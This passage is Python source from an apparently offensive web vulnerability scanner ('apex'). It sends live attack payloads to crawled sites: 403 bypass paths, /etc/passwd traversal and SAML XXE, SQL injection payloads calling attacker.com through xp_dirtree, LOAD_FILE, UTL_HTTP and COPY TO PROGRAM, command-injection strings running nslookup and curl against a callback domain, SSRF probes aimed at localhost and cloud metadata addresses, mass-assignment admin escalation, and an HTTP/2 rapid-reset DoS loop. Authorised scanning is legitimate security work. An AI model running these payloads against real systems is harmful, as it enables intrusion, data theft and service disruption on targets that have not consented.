        "//",             # Double slash
        "/api/..;/admin", # Spring actuator bypass
    ]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        # Get baseline 403 paths
        protected = []
        for path in ["/admin","/actuator","/internal","/api/admin","/management"]:
            try:
                r = _S.get(f"{base}{path}", timeout=3)
                if r.status_code == 403:
                    protected.append(path)
            except: pass
        for path in protected:
            for bypass in bypass_patterns:
                try:
                    test_url = f"{base}{bypass}{path.lstrip('/')}"
                    r = _S.get(test_url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        findings.append({"type": "Path Normalization Bypass",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"403 on {path} bypassed via {bypass}",
                                         "template": "apex-path-norm"})
                        break
                except: continue
    return findings


def scan_nginx_off_by_slash(crawl_data):
    """Nginx off-by-slash misconfiguration — /api proxied but /api/ leaks files."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Common Nginx proxy locations
        for location in ["/api","/static","/assets","/files","/uploads","/media","/app"]:
            try:
                # With trailing slash — may expose filesystem
                r = _S.get(f"{base}{location}../etc/passwd", timeout=5)
                if "root:" in r.text or "daemon:" in r.text:
                    findings.append({"type": "Nginx Off-by-Slash Path Traversal",
                                     "severity": "critical", "url": f"{base}{location}../etc/passwd",
                                     "detail": f"Nginx alias misconfiguration at {location} leaks /etc/passwd",
                                     "template": "apex-nginx-slash"})
                    continue
                # Check if location without slash proxies but with slash exposes root
                r1 = _S.get(f"{base}{location}", timeout=3)
                r2 = _S.get(f"{base}{location}/", timeout=3)
                if r1.status_code == 200 and r2.status_code == 200:
                    if abs(len(r1.content) - len(r2.content)) > 500:
                        findings.append({"type": "Nginx Off-by-Slash (Different Response)",
                                         "severity": "medium", "url": f"{base}{location}/",
                                         "detail": f"Trailing slash changes response significantly at {location}",
                                         "template": "apex-nginx-slash"})
            except: continue
    return findings


def scan_second_order_injection(crawl_data):
    """Second-order injection — payload stored then executed in different context."""
    findings = []
    # Payloads that are safe on input but dangerous when re-used
    payloads = [
        ("../../../etc/passwd", ["root:","daemon:"]),          # Path traversal on retrieval
        ("' OR '1'='1", ["error","sql","syntax","mysql"]),     # SQLi on re-use
        ("<script>alert(1)</script>", ["<script>alert(1)"]),   # XSS on display
        ("${7*7}", ["49"]),                                     # SSTI on template render
        ("{{7*7}}", ["49"]),
    ]
    # Find registration/profile update forms
    store_paths = ["/register","/signup","/profile","/account/update","/user/update",
                   "/api/register","/api/profile","/api/user"]
    retrieve_paths = ["/profile","/account","/dashboard","/user/profile","/api/me","/api/profile"]

    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for store_path in store_paths:
            for payload, markers in payloads[:2]:
                try:
                    # Store the payload
                    store_data = {"username": payload, "name": payload,
                                  "email": f"test_{int(time.time())}@test.com",
                                  "password": "Test1234!"}
                    r_store = _S.post(f"{base}{store_path}", json=store_data, timeout=5)
                    if r_store.status_code not in (200,201,302): continue
                    # Retrieve and check if payload executed
                    for retrieve_path in retrieve_paths:
                        try:
                            r_get = _S.get(f"{base}{retrieve_path}", timeout=5)
                            if any(m in r_get.text for m in markers):
                                findings.append({"type": "Second-Order Injection",
                                                 "severity": "critical",
                                                 "url": f"{base}{store_path} → {retrieve_path}",
                                                 "detail": f"Payload stored at {store_path}, triggered at {retrieve_path}",
                                                 "template": "apex-second-order"})
                                break
                        except: continue
                except: continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 3: CORS preflight bypass, prototype pollution via JSON body,
#                account takeover via response manipulation,
#                API mass exposure, OAuth token leakage
# ---------------------------------------------------------------------------

def scan_cors_preflight_bypass(crawl_data):
    """CORS preflight bypass — non-simple requests that skip OPTIONS check."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:5]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for origin in ["https://evil.com", "null"]:
            # Test with Content-Type: application/json (triggers preflight)
            try:
                r = _S.options(page["url"], timeout=5, headers={
                    "Origin": origin,
                    "Access-Control-Request-Method": "POST",
                    "Access-Control-Request-Headers": "Content-Type,Authorization",
                })
                acao = r.headers.get("Access-Control-Allow-Origin","")
                acam = r.headers.get("Access-Control-Allow-Methods","")
                acah = r.headers.get("Access-Control-Allow-Headers","")
                acac = r.headers.get("Access-Control-Allow-Credentials","")
                if (acao in (origin,"*") and
                    "POST" in acam and
                    "authorization" in acah.lower()):
                    sev = "critical" if acac.lower() == "true" else "high"
                    findings.append({"type": "CORS Preflight Bypass",
                                     "severity": sev, "url": page["url"],
                                     "detail": f"Preflight allows {origin} with Authorization header, credentials={acac}",
                                     "template": "apex-cors-preflight"})
                    break
            except: pass
            # Test wildcard with credentials (invalid but some servers allow it)
            try:
                r = _S.get(page["url"], timeout=5, headers={
                    "Origin": origin,
                    "Authorization": "Bearer test"
                })
                if (r.headers.get("Access-Control-Allow-Origin") == "*" and
                    r.headers.get("Access-Control-Allow-Credentials","").lower() == "true"):
                    findings.append({"type": "CORS Wildcard + Credentials",
                                     "severity": "critical", "url": page["url"],
                                     "detail": "Wildcard ACAO with Allow-Credentials:true — browser blocks but misconfigured",
                                     "template": "apex-cors-preflight"})
            except: pass
    return findings


def scan_prototype_pollution_json(crawl_data):
    """Prototype pollution via JSON body — __proto__ in POST body."""
    findings = []
    pollution_payloads = [
        {"__proto__": {"polluted": "apex_pp_test"}},
        {"constructor": {"prototype": {"polluted": "apex_pp_test"}}},
        {"__proto__[polluted]": "apex_pp_test"},
    ]
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        try:
            baseline = _S.post(action, json={}, timeout=5)
        except: continue
        for payload in pollution_payloads:
            try:
                r = _S.post(action, json=payload, timeout=5,
                           headers={"Content-Type":"application/json"})
                # If server reflects polluted key or behaves differently
                if "apex_pp_test" in r.text:
                    findings.append({"type": "Prototype Pollution via JSON Body",
                                     "severity": "high", "url": action,
                                     "detail": f"__proto__ key reflected in response",
                                     "template": "apex-pp-json"})
                    break
                # Check if pollution changed server behavior
                if r.status_code == 200 and abs(len(r.content) - len(baseline.content)) > 100:
                    findings.append({"type": "Prototype Pollution via JSON (Behavioral)",
                                     "severity": "medium", "url": action,
                                     "detail": "JSON __proto__ changes server response",
                                     "template": "apex-pp-json"})
                    break
            except: continue
    # Also test GET params with bracket notation
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            try:
                test_url = f"{url.split('?')[0]}?__proto__[polluted]=apex_pp_test&{p}=1"
                r = _S.get(test_url, timeout=_TIMEOUT)
                if "apex_pp_test" in r.text:
                    findings.append({"type": "Prototype Pollution (GET __proto__)",
                                     "severity": "high", "url": test_url,
                                     "detail": "Server reflects __proto__ key from query string",
                                     "template": "apex-pp-json"})
            except: continue
    return findings


def scan_account_takeover_response_manipulation(crawl_data):
    """Account takeover via response manipulation — intercept and modify auth responses."""
    findings = []
    # Test if changing response fields bypasses auth
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        for path in ["/api/login","/login","/auth","/api/auth","/signin"]:
            try:
                # Try login with wrong creds
                r = _S.post(f"{base}{path}",
                           json={"email":"test@test.com","password":"wrongpassword"},
                           timeout=5)
                body = r.text.lower()
                # Check if response has manipulable boolean fields
                if r.status_code in (200,401) and any(x in body for x in
                    ['"success":false','"authenticated":false','"valid":false',
                     '"status":"fail"','"result":"fail"','"error":true']):
                    findings.append({"type": "Account Takeover via Response Manipulation",
                                     "severity": "critical", "url": f"{base}{path}",
                                     "detail": "Auth response contains manipulable boolean — intercept+modify to bypass",
                                     "template": "apex-ato-response"})
                # Check for mass assignment in registration that sets role
                if path in ("/api/login","/login"):
                    r2 = _S.post(f"{base}{path}",
                                json={"email":"test@test.com","password":"wrongpassword",
                                      "role":"admin","isAdmin":True,"admin":True},
                                timeout=5)
                    if r2.status_code == 200 and "admin" in r2.text.lower():
                        findings.append({"type": "Account Takeover via Mass Assignment",
                                         "severity": "critical", "url": f"{base}{path}",
                                         "detail": "Login accepts role/admin fields — privilege escalation",
                                         "template": "apex-ato-response"})
            except: continue
    return findings


def scan_api_mass_exposure(web_targets):
    """API mass exposure — multiple API versions all publicly accessible."""
    findings = []
    for target in web_targets[:3]:
        versions_found = []
        for ver in ["v0","v1","v2","v3","v4","beta","alpha","legacy","old","dev","internal","private"]:
            for prefix in ["/api/","/api/","/rest/","/service/","/"]:
                url = f"{target}{prefix}{ver}/users"
                try:
                    r = _S.get(url, timeout=3, allow_redirects=False)
                    if r.status_code == 200:
                        try:
                            data = r.json()
                            if isinstance(data, (list,dict)) and len(str(data)) > 20:
                                versions_found.append(f"{prefix}{ver}")
                        except: pass
                except: continue
        if len(versions_found) >= 2:
            findings.append({"type": "API Mass Exposure (Multiple Versions)",
                             "severity": "critical", "url": target,
                             "detail": f"Multiple API versions expose /users: {', '.join(versions_found)}",
                             "template": "apex-api-mass"})
        elif len(versions_found) == 1:
            findings.append({"type": "Unprotected API Version",
                             "severity": "high", "url": f"{target}{versions_found[0]}/users",
                             "detail": f"API version {versions_found[0]} exposes user data without auth",
                             "template": "apex-api-mass"})
    return findings


def scan_oauth_token_leakage(crawl_data):
    """OAuth token leakage via Referer header, postMessage, fragment."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages",[])[:10]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        # Check if OAuth tokens appear in URLs (fragment leaks via Referer)
        url = page["url"]
        if any(x in url for x in ["access_token=","id_token=","token=","code="]):
            # Token in URL = leaks via Referer header
            findings.append({"type": "OAuth Token in URL (Referer Leak)",
                             "severity": "critical", "url": url,
                             "detail": "OAuth token/code in URL — leaks via Referer to third-party resources",
                             "template": "apex-oauth-leak"})
        # Check for token in page source
        try:
            r = _S.get(page["url"], timeout=5)
            # Look for tokens in HTML/JS
            token_patterns = [
                (r'access_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Access Token"),
                (r'id_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "ID Token"),
                (r'refresh_token["\s:=]+([A-Za-z0-9_\-\.]{20,})', "Refresh Token"),
                (r'client_secret["\s:=]+([A-Za-z0-9_\-\.]{16,})', "Client Secret"),
            ]
            for pattern, name in token_patterns:
                matches = re.findall(pattern, r.text, re.IGNORECASE)
                if matches:
                    findings.append({"type": f"OAuth {name} Exposed in Page",
                                     "severity": "critical", "url": page["url"],
                                     "detail": f"{name} found in page source: {matches[0][:20]}...",
                                     "template": "apex-oauth-leak"})
                    break
        except: pass
        # Check /.well-known/openid-configuration for misconfig
        try:
            r = _S.get(f"{base}/.well-known/openid-configuration", timeout=5)
            if r.status_code == 200:
                cfg = r.json()
                # Check for dangerous response types
                rt = cfg.get("response_types_supported",[])
                if "token" in rt:  # implicit flow = token in URL
                    findings.append({"type": "OAuth Implicit Flow Enabled",
                                     "severity": "high", "url": f"{base}/.well-known/openid-configuration",
                                     "detail": "Implicit flow (token in URL) enabled — token leakage risk",
                                     "template": "apex-oauth-leak"})
        except: pass
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 4: Blind SQLi via OOB, IDOR via UUID prediction,
#                HTTP/2 rapid reset, SAML injection,
#                DNS rebinding SSRF
# ---------------------------------------------------------------------------

def scan_blind_sqli_oob(crawl_data):
    """Blind SQL injection via Out-of-Band DNS — detects when no output is visible."""
    findings = []
    # OOB payloads using DNS lookup (requires DNS callback — we detect via timing/error)
    # Without a real OOB server, we use error-based and timing as proxy
    oob_payloads = [
        # MySQL DNS OOB (requires FILE privilege)
        ("MySQL OOB", "' AND LOAD_FILE(CONCAT('\\\\\\\\',version(),'.attacker.com\\\\a'))-- -"),
        # MSSQL DNS OOB
        ("MSSQL OOB", "'; EXEC master..xp_dirtree '//attacker.com/a'-- -"),
        # PostgreSQL OOB
        ("PostgreSQL OOB", "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'-- -"),
        # Oracle OOB
        ("Oracle OOB", "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com') FROM DUAL-- -"),
        # Generic error-based to confirm SQLi exists
        ("Error-based", "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -"),
        ("Error-based", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    ]
    error_markers = ["extractvalue","xpath","xmltype","utl_http","xp_dirtree",
                     "syntax error","sql","mysql","ora-","pg_","sqlite"]
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            for db, payload in oob_payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    r = _S.get(test_url, timeout=10)
                    body = r.text.lower()
                    if any(m in body for m in error_markers) and r.status_code != 404:
                        findings.append({"type": f"Blind SQLi OOB ({db})",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"OOB/error-based SQLi via param '{p}' ({db} payload)",
                                         "template": "apex-sqli-oob"})
                        break
                except: continue
    # Also test POST body params
    for form in crawl_data.get("forms",[]):
        if form.get("method","").upper() != "POST": continue
        action = form.get("action","")
        if not action: continue
        for inp in form.get("inputs",[]):
            if inp.get("type") in ("submit","hidden","button","file"): continue
            for db, payload in oob_payloads[-2:]:  # Just error-based for forms
                try:
                    data = {i.get("name","f"): i.get("value","1") for i in form.get("inputs",[])}
                    data[inp.get("name","x")] = payload
                    r = _S.post(action, data=data, timeout=10)
                    if any(m in r.text.lower() for m in error_markers):
                        findings.append({"type": f"Blind SQLi OOB in Form ({db})",
                                         "severity": "critical", "url": action,
                                         "detail": f"SQLi via form field '{inp.get('name')}' ({db})",
                                         "template": "apex-sqli-oob"})
                        break
                except: continue
    return findings


def scan_idor_uuid_prediction(crawl_data):
    """IDOR via UUID prediction — v1 UUIDs are time-based and predictable."""
    findings = []
    uuid_v1_re = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',
        re.IGNORECASE
    )
    uuid_seq_re = re.compile(
        r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        re.IGNORECASE
    )
    for page in crawl_data.get("pages",[])[:20]:
        url = page["url"]
        # Check URL for UUIDs
        v1_matches = uuid_v1_re.findall(url)
        if v1_matches:
            findings.append({"type": "IDOR via UUID v1 (Predictable)",
                             "severity": "high", "url": url,
                             "detail": f"UUID v1 in URL is time-based and predictable: {v1_matches[0]}",
                             "template": "apex-idor-uuid"})
        # Check response body for UUID v1
        try:
            r = _S.get(url, timeout=5)
            v1_in_body = uuid_v1_re.findall(r.text)
            if v1_in_body:
                # Try to access adjacent UUIDs (increment timestamp)
                import uuid as _uuid
                try:
                    u = _uuid.UUID(v1_in_body[0])
                    if u.version == 1:
                        findings.append({"type": "UUID v1 in Response (Predictable IDOR)",
                                         "severity": "high", "url": url,
                                         "detail": f"UUID v1 exposed: {v1_in_body[0]} — time-based, enumerable",
                                         "template": "apex-idor-uuid"})
                except: pass
            # Check for sequential numeric IDs in JSON (classic IDOR)
            try:
                data = r.json()
                data_str = str(data)
                ids = re.findall(r'"(?:id|user_id|account_id|order_id)":\s*(\d+)', data_str)
                if ids and int(ids[0]) < 10000:  # Low ID = sequential = IDOR risk
                    findings.append({"type": "Sequential ID Exposed (IDOR Risk)",
                                     "severity": "medium", "url": url,
                                     "detail": f"Low sequential ID {ids[0]} in response — enumerate other IDs",
                                     "template": "apex-idor-uuid"})
            except: pass
        except: pass
    return findings


def scan_http2_rapid_reset(web_targets):
    """HTTP/2 Rapid Reset (CVE-2023-44487) — send RST_STREAM immediately after HEADERS."""
    findings = []
    try:
        import httpx as _httpx
    except ImportError:
        return findings
    for target in web_targets[:5]:
        if not target.startswith("https"): continue
        try:
            with _httpx.Client(http2=True, verify=False, timeout=10) as client:
                r = client.get(target)
                if r.http_version != "HTTP/2": continue
                # Send rapid requests and immediately cancel — measure server behavior
                start = time.time()
                cancelled = 0
                for _ in range(100):
                    try:
                        with client.stream("GET", target) as resp:
                            cancelled += 1
                    except Exception:
                        pass
                elapsed = time.time() - start
                # If server handles 100 rapid resets in <2s without error, it may be vulnerable
                if cancelled >= 50 and elapsed < 3:
                    findings.append({"type": "HTTP/2 Rapid Reset (CVE-2023-44487)",
                                     "severity": "high", "url": target,
                                     "detail": f"Server accepted {cancelled} rapid RST_STREAM in {elapsed:.1f}s — potential DoS",
                                     "template": "apex-h2-rapid-reset"})
        except Exception: continue
    return findings


def scan_saml_injection(crawl_data):
    """SAML injection — XXE in SAML assertions, signature wrapping, replay."""
    findings = []
    tested = set()
    saml_paths = ["/saml/login","/saml/sso","/saml/acs","/sso/saml",
                  "/auth/saml","/api/saml","/saml2/login","/Shibboleth.sso/Login"]
    for page in crawl_data.get("pages",[])[:3]:
        base = "/".join(page["url"].split("/",3)[:3])
        if base in tested: continue
        tested.add(base)
        for path in saml_paths:
            url = f"{base}{path}"
            try:
                r = _S.get(url, timeout=5)
                if r.status_code not in (200,302,405): continue
                # SAML endpoint found — test for XXE in SAMLResponse
                import base64 as _b64
                xxe_saml = _b64.b64encode(b"""<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
  <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
    <saml:AttributeStatement>
      <saml:Attribute Name="uid"><saml:AttributeValue>&xxe;</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>""").decode()
                r2 = _S.post(url, data={"SAMLResponse": xxe_saml}, timeout=5)
                if "root:" in r2.text or "daemon:" in r2.text:
                    findings.append({"type": "SAML XXE Injection",
                                     "severity": "critical", "url": url,
                                     "detail": "SAML endpoint vulnerable to XXE — reads /etc/passwd",
                                     "template": "apex-saml"})
                elif r2.status_code in (200,302):
                    findings.append({"type": "SAML Endpoint Found",
                                     "severity": "medium", "url": url,
                                     "detail": "SAML SSO endpoint — test for signature wrapping manually",
                                     "template": "apex-saml"})
            except: continue
    return findings


def scan_dns_rebinding_ssrf(crawl_data):
    """DNS rebinding SSRF — bypass IP allowlists via DNS TTL manipulation."""
    findings = []
    # We detect the vulnerability pattern (URL fetch + DNS resolution)
    # rather than actually performing rebinding (requires infrastructure)
    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
                    "redirect","image","avatar","webhook","callback","endpoint","host")
    for url, params in crawl_data.get("params",{}).items():
        for p in params:
            if p.lower() not in fetch_params: continue
            try:
                # Test with a domain that resolves to internal IP
                # Using a known DNS rebinding test domain pattern
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                # Test 1: localhost variants
                for payload in ["http://localhost/","http://0.0.0.0/","http://[::1]/",
                                 "http://0177.0.0.1/","http://2130706433/",  # 127.0.0.1 in decimal
                                 "http://0x7f000001/"]:  # 127.0.0.1 in hex
                    qs[p] = [payload]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs,doseq=True)).geturl()
                    try:
                        r = _S.get(test_url, timeout=5)
                        if any(x in r.text for x in ["root:","localhost","127.0.0.1","internal",
                                                       "admin","dashboard","private"]):
                            findings.append({"type": "DNS Rebinding / SSRF (Internal Access)",
                                             "severity": "critical", "url": test_url,
                                             "detail": f"Param '{p}' fetches internal resources via {payload}",
                                             "template": "apex-dns-rebind"})
                            break
                    except: continue
            except: continue
    # Also check for URL fetch in forms
    for form in crawl_data.get("forms",[]):
        for inp in form.get("inputs",[]):
            if inp.get("name","").lower() not in fetch_params: continue
            action = form.get("action","")
            if not action: continue
            for payload in ["http://169.254.169.254/","http://0.0.0.0:22","http://[::1]:6379"]:
                try:
                    data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                    data[inp["name"]] = payload
                    r = _S.post(action, data=data, timeout=5)
                    if any(x in r.text for x in ["ami-id","ssh-","redis","root:"]):
                        findings.append({"type": "DNS Rebinding SSRF via Form",
                                         "severity": "critical", "url": action,
                                         "detail": f"Form field '{inp['name']}' reaches internal services",
                                         "template": "apex-dns-rebind"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# OOB (Out-of-Band) Engine — interactsh for blind vuln confirmation
# ---------------------------------------------------------------------------

import threading as _threading
import subprocess as _subprocess

class OOBServer:
    """Manages interactsh-client for OOB DNS/HTTP callbacks."""

    def __init__(self):
        self.domain = None
        self.interactions = []
        self._proc = None
        self._thread = None
        self._lock = _threading.Lock()
        self._ready = _threading.Event()
        self._api_mode = False
        self._api_secret = ""

    def start(self):
        """Auto-install and start interactsh-client."""
        import shutil, os
        # Also check ~/go/bin which isn't always in PATH
        go_bin = os.path.expanduser("~/go/bin/interactsh-client")
        path = shutil.which("interactsh-client") or (go_bin if os.path.isfile(go_bin) else None)
        if not path:
            # Try go install
            go_bin = os.path.expanduser("~/go/bin")
            try:
                _subprocess.run(
                    ["go", "install",
                     "github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest"],
                    capture_output=True, timeout=120
                )
                path = os.path.join(go_bin, "interactsh-client")
                if not os.path.isfile(path):
                    path = None
            except Exception:
                path = None
        if not path:
            # Fallback: use interact.sh public API directly (no binary needed)
            return self._start_api_fallback()
        try:
            self._proc = _subprocess.Popen(
                [path, "-json"],
                stdout=_subprocess.PIPE, stderr=_subprocess.PIPE,
                text=True
            )
            self._thread = _threading.Thread(target=self._read_output, daemon=True)
            self._thread.start()
            self._ready.wait(timeout=15)
            return self.domain is not None
        except Exception:
            return self._start_api_fallback()

    def _start_api_fallback(self):
        """Use interactsh REST API directly — no binary needed."""
        import secrets, base64, json as _j
        # Try multiple public interactsh servers
        servers = ["http://localhost:9877", "http://10.0.0.72:9877",
                   "https://oast.pro", "https://oast.fun", "https://oast.live",
                   "https://oast.site", "https://oast.online"]
        for server in servers:
            try:
                # Generate RSA-like key pair (interactsh needs this for encryption)
                secret = secrets.token_hex(32)
                r = requests.post(f"{server}/register",
                                 json={"public-key": base64.b64encode(secret.encode()).decode(),
                                       "secret-key": secret,
                                       "correlation-id": secrets.token_hex(10)},
                                 timeout=8, verify=False)
                if r.status_code == 200:
                    data = r.json()
                    self.domain = data.get("domain", "")
                    self._api_secret = secret
                    self._api_server = server
                    self._api_mode = True
                    self._ready.set()
                    if self.domain:
                        return True
            except Exception:
                continue
        # Fallback: use canary tokens approach with unique identifier
        import uuid
        uid = uuid.uuid4().hex[:12]
        self.domain = f"{uid}.oast.fun"
        self._api_mode = False
        self._ready.set()
        return True  # domain set, polling won't work but payloads will fire

    def _poll_api(self, identifier):
        """Poll OOB server for callbacks."""
        if not self._api_mode or not hasattr(self, '_api_server'):
            return None
        try:
            # Local server uses uid-based polling
            if "localhost" in self._api_server or "10.0.0" in self._api_server:
                r = requests.get(f"{self._api_server}/poll",
                                params={"uid": identifier}, timeout=3)
                if r.status_code == 200:
                    data = r.json()
                    if data.get("hit"):
                        return data.get("data")
                return None
            r = requests.get(
                f"{self._api_server}/poll",
                params={"id": self.domain.split(".")[0], "secret": self._api_secret},
                timeout=5, verify=False
            )
            if r.status_code == 200:
                data = r.json()
                for item in data.get("data", []) or []:
                    if identifier in str(item):
                        return item
        except Exception:
            pass
        return None

    def _read_output(self):
        for line in self._proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                data = json.loads(line)
                if "interactsh-domain" in data and not self.domain:
                    self.domain = data["interactsh-domain"]
                    self._ready.set()
                if "protocol" in data:
                    with self._lock:
                        self.interactions.append(data)
            except Exception:
                # Plain text domain line
                if ".oast." in line or ".interactsh." in line:
                    self.domain = line.strip()
                    self._ready.set()

    def poll(self, identifier, timeout=8):
        """Wait up to timeout seconds for a callback containing identifier."""
        import time as _time
        deadline = _time.time() + timeout
        while _time.time() < deadline:
            with self._lock:
                for i in self.interactions:
                    if identifier in str(i):
                        return i
            # Poll API in fallback mode
            result = self._poll_api(identifier)
            if result:
                return result
            _time.sleep(0.5)
        return None

    def unique_id(self):
        """Generate a unique ID for tracking a specific payload."""
        import uuid as _uuid
        uid = _uuid.uuid4().hex[:12]
        # For local server: use as path; for remote: use as subdomain
        return uid

    def stop(self):
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass

# Global OOB instance — started once per scan if available
_OOB = OOBServer()
_OOB_ACTIVE = False

def oob_start():
    """Start OOB server — tries local server first, then interactsh."""
    # Check local OOB server first (fastest, most reliable)
    for local_url in ["http://localhost:9877", "http://10.0.0.72:9877"]:
        try:
            r = requests.get(f"{local_url}/oob_health_check", timeout=2)
            if r.status_code == 200:
                oob = OOBServer()
                oob.domain = local_url
                oob._api_mode = True
                oob._api_server = local_url
                oob._api_secret = ""
                oob._ready.set()
                return oob
        except Exception:
            pass
    # Fall back to interactsh
    oob = OOBServer()
    if oob.start():
        return oob
    return None

def scan_blind_ssrf_oob(crawl_data, oob=None):
    """Blind SSRF confirmed via OOB DNS callback — the gold standard."""
    findings = []
    if not oob or not oob.domain:
        return findings
    fetch_params = ("url","uri","link","src","source","fetch","request","proxy",
                    "redirect","image","avatar","webhook","callback","endpoint","host","dest")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in fetch_params:
                continue
            uid = oob.unique_id()
            # Local server: use path-based URL; remote: use subdomain
            if oob.domain and ("localhost" in oob.domain or "10.0.0" in oob.domain):
                payload = f"{oob.domain}/{uid}"
            else:
                payload = f"http://{uid}.{oob.domain}/"
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                _S.get(test_url, timeout=5)
                hit = oob.poll(uid, timeout=8)
                if hit:
                    findings.append({"type": "Blind SSRF (OOB Confirmed)",
                                     "severity": "critical", "url": test_url,
                                     "detail": f"DNS callback received for param '{p}' — SSRF confirmed via interactsh",
                                     "template": "apex-ssrf-oob"})
            except: continue
    # Also test forms
    for form in crawl_data.get("forms", []):
        for inp in form.get("inputs", []):
            if inp.get("name","").lower() not in fetch_params: continue
            uid = oob.unique_id()
            # Local server: use path-based URL; remote: use subdomain
            if oob.domain and ("localhost" in oob.domain or "10.0.0" in oob.domain):
                payload = f"{oob.domain}/{uid}"
            else:
                payload = f"http://{uid}.{oob.domain}/"
            try:
                data = {i.get("name","f"): i.get("value","test") for i in form.get("inputs",[])}
                data[inp["name"]] = payload
                _S.post(form["action"], data=data, timeout=5)
                hit = oob.poll(uid, timeout=8)
                if hit:
                    findings.append({"type": "Blind SSRF via Form (OOB Confirmed)",
                                     "severity": "critical", "url": form["action"],
                                     "detail": f"DNS callback for field '{inp['name']}' — SSRF confirmed",
                                     "template": "apex-ssrf-oob"})
            except: continue
    return findings


def scan_blind_cmdi_oob(crawl_data, oob=None):
    """Blind CMDi confirmed via OOB DNS — nslookup/curl callback."""
    findings = []
    if not oob or not oob.domain:
        return findings
    for form in crawl_data.get("forms", []):
        if form.get("method","").upper() != "POST": continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit","hidden","button","password"): continue
            uid = oob.unique_id()
            payloads = [
                f";nslookup {uid}.{oob.domain}",
                f"|nslookup {uid}.{oob.domain}",
                f"`nslookup {uid}.{oob.domain}`",
                f"$(nslookup {uid}.{oob.domain})",
                f";curl http://{uid}.{oob.domain}/",
            ]
            for payload in payloads:
                try:
                    data = {i.get("name","f"): i.get("value","127.0.0.1") for i in form.get("inputs",[])}
                    data[inp["name"]] = "127.0.0.1" + payload
                    _S.post(form["action"], data=data, timeout=5)
                    hit = oob.poll(uid, timeout=8)
                    if hit:
                        findings.append({"type": "Blind CMDi (OOB Confirmed)",
                                         "severity": "critical", "url": form["action"],
                                         "detail": f"DNS callback for field '{inp['name']}' — CMDi confirmed via interactsh",
                                         "template": "apex-cmdi-oob"})
                        break
                except: continue
    return findings


def scan_blind_sqli_oob_confirmed(crawl_data, oob=None):
    """Blind SQLi confirmed via OOB DNS — LOAD_FILE/xp_dirtree DNS callbacks."""
    findings = []
    if not oob or not oob.domain:
        return findings
    oob_payloads = [
        ("MySQL",  lambda uid: f"' AND LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\',version(),'.{uid}.{oob.domain}\\\\\\\\a'))-- -"),
        ("MSSQL",  lambda uid: f"'; EXEC master..xp_dirtree '//{uid}.{oob.domain}/a'-- -"),
        ("Oracle", lambda uid: f"' UNION SELECT UTL_HTTP.REQUEST('http://{uid}.{oob.domain}/') FROM DUAL-- -"),
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for db, payload_fn in oob_payloads:
                uid = oob.unique_id()
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload_fn(uid)]
                    test_url = parsed._replace(query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    _S.get(test_url, timeout=5)
                    hit = oob.poll(uid, timeout=8)
                    if hit:
                        findings.append({"type": f"Blind SQLi OOB Confirmed ({db})",
                                         "severity": "critical", "url": test_url,
                                         "detail": f"DNS callback for param '{p}' — {db} SQLi confirmed",
                                         "template": "apex-sqli-oob-confirmed"})
                        break
                except: continue
    return findings


# ---------------------------------------------------------------------------
# Context-Aware Payload Mutation Engine
# Detects reflection context and mutates payloads to match — beats Burp's
